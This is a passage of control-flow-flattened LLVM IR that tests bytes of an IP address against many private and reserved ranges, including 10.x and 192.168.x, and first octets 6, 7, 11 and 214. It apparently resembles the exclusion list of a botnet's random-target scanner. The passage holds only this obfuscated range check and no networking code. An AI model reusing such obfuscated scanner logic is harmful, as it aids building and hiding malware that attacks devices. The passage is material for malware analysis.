  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 56
  %38 = select i1 %37, i32 -1813357520, i32 -1099722286
  store i32 %38, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 10
  %43 = select i1 %42, i32 -1813357520, i32 2084647272
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 25
  %48 = select i1 %47, i32 -1813357520, i32 -1379084013
  store i32 %48, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 49
  %53 = select i1 %52, i32 -1813357520, i32 -1309942438
  store i32 %53, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 50
  %58 = select i1 %57, i32 -1813357520, i32 -1283871995
  store i32 %58, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 137
  %63 = select i1 %62, i32 -1813357520, i32 1986890670
  store i32 %63, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 6
  %68 = select i1 %67, i32 -1813357520, i32 1809037749
  store i32 %68, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 7
  %73 = select i1 %72, i32 -1813357520, i32 1320598571
  store i32 %73, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 11
  %78 = select i1 %77, i32 -1813357520, i32 538446139
  store i32 %78, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 21
  %83 = select i1 %82, i32 -1813357520, i32 -844965367
  store i32 %83, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp eq i32 %86, 22
  %88 = select i1 %87, i32 -1813357520, i32 593549954
  store i32 %88, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 26
  %93 = select i1 %92, i32 -1813357520, i32 -526604875
  store i32 %93, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 28
  %98 = select i1 %97, i32 -1813357520, i32 305949490
  store i32 %98, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 29
  %103 = select i1 %102, i32 -1813357520, i32 -1170846938
  store i32 %103, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 30
  %108 = select i1 %107, i32 -1813357520, i32 526959911
  store i32 %108, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 33
  %113 = select i1 %112, i32 -1813357520, i32 -520940149
  store i32 %113, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 55
  %118 = select i1 %117, i32 -1813357520, i32 -1718862698
  store i32 %118, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 214
  %123 = select i1 %122, i32 -1813357520, i32 -534865667
  store i32 %123, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 215
  %128 = select i1 %127, i32 -1813357520, i32 1326478321
  store i32 %128, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 192
  %133 = select i1 %132, i32 -324314701, i32 1256678037
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 168
  %138 = select i1 %137, i32 -1813357520, i32 1256678037
  store i32 %138, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 146
  %143 = select i1 %142, i32 1128975186, i32 1102086625
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 17
  %148 = select i1 %147, i32 -1813357520, i32 1102086625
  store i32 %148, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 146
  %153 = select i1 %152, i32 -373150989, i32 -1324650115
  store i32 %153, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 80
  %158 = select i1 %157, i32 -1813357520, i32 -1324650115
  store i32 %158, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 146
  %163 = select i1 %162, i32 1129599281, i32 2112333654
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %166 = zext i8 %165 to i32
  %167 = icmp eq i32 %166, 98
  %168 = select i1 %167, i32 -1813357520, i32 2112333654
  store i32 %168, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 146
  %173 = select i1 %172, i32 -2051990471, i32 1079313728
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 154
  %178 = select i1 %177, i32 -1813357520, i32 1079313728
  store i32 %178, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 147
  %183 = select i1 %182, i32 52206750, i32 42502658
  store i32 %183, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %186 = zext i8 %185 to i32
  %187 = icmp eq i32 %186, 159
  %188 = select i1 %187, i32 -1813357520, i32 42502658
  store i32 %188, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 148
  %193 = select i1 %192, i32 -368963253, i32 1835297111
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %196 = zext i8 %195 to i32
  %197 = icmp eq i32 %196, 114
  %198 = select i1 %197, i32 -1813357520, i32 1835297111
  store i32 %198, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 %201, 150
  %203 = select i1 %202, i32 -805941197, i32 1719107441
  store i32 %203, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %206 = zext i8 %205 to i32
  %207 = icmp eq i32 %206, 125
  %208 = select i1 %207, i32 -1813357520, i32 1719107441
  store i32 %208, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  %210 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %211 = zext i8 %210 to i32
  %212 = icmp eq i32 %211, 150
  %213 = select i1 %212, i32 419536999, i32 1022195561
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 133
  %218 = select i1 %217, i32 -1813357520, i32 1022195561
  store i32 %218, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 150
  %223 = select i1 %222, i32 1633335535, i32 1558931973
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %226 = zext i8 %225 to i32
  %227 = icmp eq i32 %226, 144
  %228 = select i1 %227, i32 -1813357520, i32 1558931973
  store i32 %228, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %231 = zext i8 %230 to i32
  %232 = icmp eq i32 %231, 150
  %233 = select i1 %232, i32 1638248769, i32 864093599
  store i32 %233, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 149
  %238 = select i1 %237, i32 -1813357520, i32 864093599
  store i32 %238, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %241 = zext i8 %240 to i32
  %242 = icmp eq i32 %241, 150
  %243 = select i1 %242, i32 -1972833115, i32 640055272
  store i32 %243, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %246 = zext i8 %245 to i32
  %247 = icmp eq i32 %246, 157
  %248 = select i1 %247, i32 -1813357520, i32 640055272
  store i32 %248, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %251 = zext i8 %250 to i32
  %252 = icmp eq i32 %251, 150
  %253 = select i1 %252, i32 -1384811819, i32 -280623510
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 184
  %258 = select i1 %257, i32 -1813357520, i32 -280623510
  store i32 %258, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  %260 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %261 = zext i8 %260 to i32
  %262 = icmp eq i32 %261, 150
  %263 = select i1 %262, i32 1782090878, i32 2074703756
  store i32 %263, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %266 = zext i8 %265 to i32
  %267 = icmp eq i32 %266, 190
  %268 = select i1 %267, i32 -1813357520, i32 2074703756
  store i32 %268, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %271 = zext i8 %270 to i32
  %272 = icmp eq i32 %271, 150
  %273 = select i1 %272, i32 333074577, i32 303674767
  store i32 %273, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %276 = zext i8 %275 to i32
  %277 = icmp eq i32 %276, 196
  %278 = select i1 %277, i32 -1813357520, i32 303674767
  store i32 %278, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %280 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %281 = zext i8 %280 to i32
  %282 = icmp eq i32 %281, 152
  %283 = select i1 %282, i32 1257453889, i32 2105916232
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %286 = zext i8 %285 to i32
  %287 = icmp eq i32 %286, 82
  %288 = select i1 %287, i32 -1813357520, i32 2105916232
  store i32 %288, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %291 = zext i8 %290 to i32
  %292 = icmp eq i32 %291, 152
  %293 = select i1 %292, i32 125412592, i32 892462142
  store i32 %293, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 229
  %298 = select i1 %297, i32 -1813357520, i32 892462142
  store i32 %298, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %301 = zext i8 %300 to i32
  %302 = icmp eq i32 %301, 157
  %303 = select i1 %302, i32 -2050588493, i32 -381868312
  store i32 %303, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  %305 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %306 = zext i8 %305 to i32
  %307 = icmp eq i32 %306, 202
  %308 = select i1 %307, i32 -1813357520, i32 -381868312
  store i32 %308, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %311 = zext i8 %310 to i32
  %312 = icmp eq i32 %311, 157
  %313 = select i1 %312, i32 1807892819, i32 -1292338955
  store i32 %313, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %316 = zext i8 %315 to i32
  %317 = icmp eq i32 %316, 217
  %318 = select i1 %317, i32 -1813357520, i32 -1292338955
  store i32 %318, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  %320 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %321 = zext i8 %320 to i32
  %322 = icmp eq i32 %321, 161
  %323 = select i1 %322, i32 -1890429477, i32 -263714628
  store i32 %323, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  %325 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %326 = zext i8 %325 to i32
  %327 = icmp eq i32 %326, 124
  %328 = select i1 %327, i32 -1813357520, i32 -263714628
  store i32 %328, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  %330 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %331 = zext i8 %330 to i32
  %332 = icmp eq i32 %331, 162
  %333 = select i1 %332, i32 1953571300, i32 1125246097
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %336 = zext i8 %335 to i32
  %337 = icmp eq i32 %336, 32
  %338 = select i1 %337, i32 -1813357520, i32 1125246097
  store i32 %338, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %341 = zext i8 %340 to i32
  %342 = icmp eq i32 %341, 155
  %343 = select i1 %342, i32 161708964, i32 -494132507
  store i32 %343, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %346 = zext i8 %345 to i32
  %347 = icmp eq i32 %346, 96
  %348 = select i1 %347, i32 -1813357520, i32 -494132507
  store i32 %348, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %351 = zext i8 %350 to i32
  %352 = icmp eq i32 %351, 155
  %353 = select i1 %352, i32 1812355202, i32 -946916086
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %356 = zext i8 %355 to i32
  %357 = icmp eq i32 %356, 149
  %358 = select i1 %357, i32 -1813357520, i32 -946916086
  store i32 %358, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %361 = zext i8 %360 to i32
  %362 = icmp eq i32 %361, 155
  %363 = select i1 %362, i32 537732672, i32 1829786341
  store i32 %363, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  %365 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %366 = zext i8 %365 to i32
  %367 = icmp eq i32 %366, 155
  %368 = select i1 %367, i32 -1813357520, i32 1829786341
  store i32 %368, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %371 = zext i8 %370 to i32
  %372 = icmp eq i32 %371, 155
  %373 = select i1 %372, i32 1503091510, i32 -18263661
  store i32 %373, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  %375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %376 = zext i8 %375 to i32
  %377 = icmp eq i32 %376, 178
  %378 = select i1 %377, i32 -1813357520, i32 -18263661
  store i32 %378, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %381 = zext i8 %380 to i32
  %382 = icmp eq i32 %381, 164
  %383 = select i1 %382, i32 1815506232, i32 811086104
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %386 = zext i8 %385 to i32
  %387 = icmp eq i32 %386, 158
  %388 = select i1 %387, i32 -1813357520, i32 811086104
  store i32 %388, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  %390 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %391 = zext i8 %390 to i32
  %392 = icmp eq i32 %391, 156
  %393 = select i1 %392, i32 -641062947, i32 699182198
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %396 = zext i8 %395 to i32
  %397 = icmp eq i32 %396, 9
  %398 = select i1 %397, i32 -1813357520, i32 699182198
  store i32 %398, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:399:                                    ; preds = %loopEntry
  %400 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %401 = zext i8 %400 to i32
  %402 = icmp eq i32 %401, 167
  %403 = select i1 %402, i32 -1464010414, i32 -2027589454
  store i32 %403, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  %405 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %406 = zext i8 %405 to i32
  %407 = icmp eq i32 %406, 44
  %408 = select i1 %407, i32 -1813357520, i32 -2027589454
  store i32 %408, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:409:                                    ; preds = %loopEntry
  %410 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %411 = zext i8 %410 to i32
  %412 = icmp eq i32 %411, 168
  %413 = select i1 %412, i32 -2104135290, i32 390366588
  store i32 %413, i32* %switchVar
  br label %loopEnd

; <label>:414:                                    ; preds = %loopEntry
  %415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %416 = zext i8 %415 to i32
  %417 = icmp eq i32 %416, 68
  %418 = select i1 %417, i32 -1813357520, i32 390366588
  store i32 %418, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  %420 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %421 = zext i8 %420 to i32
  %422 = icmp eq i32 %421, 168
  %423 = select i1 %422, i32 572375313, i32 -2106750428
  store i32 %423, i32* %switchVar
  br label %loopEnd

; <label>:424:                                    ; preds = %loopEntry
  %425 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %426 = zext i8 %425 to i32
  %427 = icmp eq i32 %426, 85
  %428 = select i1 %427, i32 -1813357520, i32 -2106750428
  store i32 %428, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:429:                                    ; preds = %loopEntry
  %430 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %431 = zext i8 %430 to i32
  %432 = icmp eq i32 %431, 168
  %433 = select i1 %432, i32 15618238, i32 1865719967
  store i32 %433, i32* %switchVar
  br label %loopEnd

; <label>:434:                                    ; preds = %loopEntry
  %435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %436 = zext i8 %435 to i32
  %437 = icmp eq i32 %436, 102
  %438 = select i1 %437, i32 -1813357520, i32 1865719967
  store i32 %438, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
